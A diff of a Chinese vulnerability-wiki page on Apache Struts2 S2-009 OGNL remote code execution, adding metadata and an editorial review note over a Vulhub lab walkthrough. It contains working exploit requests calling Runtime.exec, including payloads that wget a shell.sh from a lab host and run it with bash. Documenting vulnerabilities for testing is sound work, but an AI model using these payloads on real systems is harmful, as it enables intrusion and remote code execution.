@@ -1,8 +1,52 @@
 ---
 source: "Threekiii/Vulnerability-Wiki"
+title: "Apache Struts2 S2-009 远程代码执行漏洞"
+product: "Apache Struts2 ParametersInterceptor / OGNL"
+record_type: "vulnerability"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+identifier_status: "active"
+primary_identifiers: "S2-009"
+referenced_identifiers: ""
+identifier_role: "primary"
+prerequisites: "2.1.0–2.3.1.1，Action暴露可绑定字符串参数；示例Example5Action/name，后续参数触发求值"
+source_status: "unknown"
+side_effects: "含反向连接或交互式命令执行方法：会产生出站连接和子进程；目标、监听端与网络须在授权隔离范围内，结束后关闭会话并核对遗留进程。"
+id: "vw-2a1686a3caad3f37b1d19ff6"
+entity_id: "ve-2a1686a3caad3f37b1d19ff6"
+schema_version: "1"
 ---
 
 # Apache Struts2 S2-009 远程代码执行漏洞
+
+<!-- vulwiki-editorial:start -->
+## 校订与适用边界
+
+- 适用前提：2.1.0–2.3.1.1，Action暴露可绑定字符串参数；示例Example5Action/name，后续参数触发求值
+- 证据范围：源码、路由和无回显文件验证连贯，保留从Action定位输入条件的分析。
+
+### 本次正文校订
+
+- 按实际内容修正 6 处代码围栏语言标记，保留其中方法与请求内容。
+
+### 尚未解决的证据缺口
+
+以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：
+
+- 前序S2-003/005是补丁关系，不应代替主009编号/版本
+- 示例helloword.acton拼错、描述example5.action实际HTTP省略.action需说明扩展配置
+- 原始query带方括号等可能被容器/客户端限制，需明确编码
+- 缺修复版本/CVE、固定Tomcat工作目录和文件清理说明
+
+### 操作风险与资料使用
+
+- 含反向连接或交互式命令执行方法：会产生出站连接和子进程；目标、监听端与网络须在授权隔离范围内，结束后关闭会话并核对遗留进程。
+
+本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
+<!-- vulwiki-editorial:end -->
+
+## 技术正文与历史材料
 
 ## 漏洞描述
 
@@ -26,7 +70,7 @@ Struts2 对 s2-003 的修复方法是禁止静态方法调用，在 s2-005 中�
 
 Vulhub 执行以下命令启动 s2-009 测试环境：
 
-```
+```shell
 docker-compose build
 docker-compose up -d
 ```
@@ -76,7 +120,7 @@ public class Example5Action extends ActionSupport {
 
 `name=example5`，所以访问 `http://your-ip:8080/ajax/example5.action` 即可访问该控制器。按照原理中说到的方法，将 OGNL 利用代码放在 name 参数里，访问该 URL：
 
-```
+```http
 GET /ajax/example5?age=12313&name=%28%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3D+new+java.lang.Boolean%28false%29,%20%23_memberAccess[%22allowStaticMethodAccess%22]%3d+new+java.lang.Boolean%28true%29,%20@java.lang.Runtime@getRuntime%28%29.exec%28%27touch%20/tmp/awesome_poc%27%29%29%28meh%29&z[%28name%29%28%27meh%27%29]=true HTTP/1.1
 Host: localhost:8080
 Accept: */*
@@ -104,25 +148,25 @@ python3环境下：python -m http.server 80
 
 上传 shell.sh 文件的命令为：
 
-```
+```shell
 wget 192.168.174.128/shell.sh
 ```
 
 上传 shell.sh 文件的 Payload 为：
 
-```
+```http
 GET /ajax/example5?age=12313&name=%28%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3D+new+java.lang.Boolean%28false%29,%20%23_memberAccess[%22allowStaticMethodAccess%22]%3d+new+java.lang.Boolean%28true%29,%20@java.lang.Runtime@getRuntime%28%29.exec%28%27wget%20192.168.174.128/shell.sh%27%29%29%28meh%29&z[%28name%29%28%27meh%27%29]=true HTTP/1.1
 ```
 
 执行 shell.sh 文件的命令为：
 
-```
+```shell
 bash /usr/local/tomcat/shell.sh
 ```
 
 执行 shell.sh 文件的 Payload 为：
 
-```
+```http
 GET /ajax/example5?age=12313&name=%28%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3D+new+java.lang.Boolean%28false%29,%20%23_memberAccess[%22allowStaticMethodAccess%22]%3d+new+java.lang.Boolean%28true%29,%20@java.lang.Runtime@getRuntime%28%29.exec%28%27bash%20/usr/local/tomcat/shell.sh%27%29%29%28meh%29&z[%28name%29%28%27meh%27%29]=true HTTP/1.1
 ```
 
